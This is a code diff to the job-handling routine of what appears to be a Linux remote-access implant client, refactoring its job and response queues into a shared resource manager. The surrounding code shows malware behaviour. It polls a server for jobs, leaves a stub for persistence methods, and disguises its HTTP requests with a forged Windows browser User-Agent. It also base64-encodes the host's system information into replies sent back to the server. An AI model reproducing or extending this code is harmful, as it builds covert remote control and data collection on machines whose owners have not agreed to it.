@@ -26,13 +26,11 @@
 #include "utilities.h"
 #include "base64.h"
 #include <sstream>
-#include <experimental/filesystem>
 #include <fstream>
 #include <unistd.h>
 #include <errno.h>
 #include <string.h>
 
-namespace fs = std::experimental::filesystem;
 
 
 bool isJobAvailable(const std::wstring &replyFromServer){
@@ -59,12 +57,13 @@ bool isJobAvailable(const std::wstring &replyFromServer){
 }
 
 
-void startJob(){
+void startJob(SharedResourceManager &sharedResources){
           
-    jobQueueMutex.lock();
-    std::wstring job (jobQueue.front());
-    jobQueue.pop();
-    jobQueueMutex.unlock();
+    // jobQueueMutex.lock();
+    // std::wstring job (jobQueue.front());
+    // jobQueue.pop();
+    // jobQueueMutex.unlock();
+    std::wstring job = sharedResources.popJob();
     std::wstring request = L"POST / HTTP/1.1\r\nHost: github.com/tajiknomi/ClientHTTP_linux?DataSignal\r\nAccept-Encoding: gzip, deflate, br\r\nUser-Agent: chromium/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/octet-stream\r\n";
     std::wstring dataToSend;
     std::wstring mode = json_ExtractValue(job, L"mode");
@@ -370,7 +369,7 @@ void startJob(){
         // Implement your persistance method(s) here
     }
 
-    dataToSend = json_AppendKeyValue(jsonSysInfo, replyType, dataToSend);
+    dataToSend = json_AppendKeyValue(sharedResources.getSysInfoInJson(), replyType, dataToSend);
     std::string dataToSendStr = ws2s(dataToSend); // Convert wstring to string   
     dataToSend = s2ws(base64_encode((unsigned char*)dataToSendStr.c_str(), dataToSendStr.length()));
     std::wstringstream contentLengthStream;
@@ -380,7 +379,8 @@ void startJob(){
     request += L"Connection: close\r\n"; 
     request += L"\r\n" + dataToSend;
     
-    responseQueueMutex.lock();
-    responseQueue.push(request);
-    responseQueueMutex.unlock();
+    sharedResources.pushResponse(request);
+    // responseQueueMutex.lock();
+    // responseQueue.push(request);
+    // responseQueueMutex.unlock();
 }
